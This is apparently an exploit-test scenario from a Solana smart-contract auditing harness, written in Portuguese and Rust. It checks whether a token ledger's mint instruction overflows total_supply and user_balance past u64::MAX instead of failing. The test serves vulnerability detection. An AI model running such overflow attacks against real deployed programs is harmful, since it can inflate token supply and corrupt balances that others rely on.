{
  "plan": "Inicializamos uma conta Ledger com total_supply proximo de u64::MAX (u64::MAX - 5) usando a instrucao initialize, com a authority como signer e pagadora. O baseline chama mint com amount=5, que deve ter sucesso e levar total_supply a u64::MAX. O ataque chama mint com amount=1, que se vulneravel causaria overflow silencioso em total_supply (voltando a 0) em vez de falhar. Medimos o efeito lendo total_supply apos o ataque: se for 0 (ou menor que o valor anterior), o overflow ocorreu; se a instrucao falhar, nenhum efeito e registrado.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let (system_id, system_acc) = system_program_account();

let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX - 5u64).to_le_bytes(),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_id, false),
    ],
);

let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    (system_id, system_acc),
];

let r_init = env.baseline("initialize ledger com supply quase maximo", &init_ix, &init_accounts);

let ledger_after_init = after(&r_init, &ledger_key).clone();

let mint_ix = env.anchor_ix(
    "mint",
    &5u64.to_le_bytes(),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let mint_accounts = vec![
    (ledger_key, ledger_after_init.clone()),
    (authority, wallet(1_000_000_000)),
];

let r_baseline = env.baseline("mint legitimo de 5", &mint_ix, &mint_accounts);

let ledger_after_baseline = after(&r_baseline, &ledger_key).clone();

let attack_ix = env.anchor_ix(
    "mint",
    &1u64.to_le_bytes(),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let attack_accounts = vec![
    (ledger_key, ledger_after_baseline.clone()),
    (authority, wallet(1_000_000_000)),
];

let r_attack = env.attack("mint de 1 apos supply em u64::MAX", &attack_ix, &attack_accounts);

if r_attack.program_result == ProgramResult::Success {
    let supply_after = read_u64(after(&r_attack, &ledger_key).data(), 40);
    let balance_after = read_u64(after(&r_attack, &ledger_key).data(), 48);
    env.effect(
        "total_supply deu a volta (overflow) em vez de falhar",
        supply_after < u64::MAX,
    );
    env.effect(
        "user_balance tambem sofreu overflow",
        balance_after < u64::MAX,
    );
}"
}

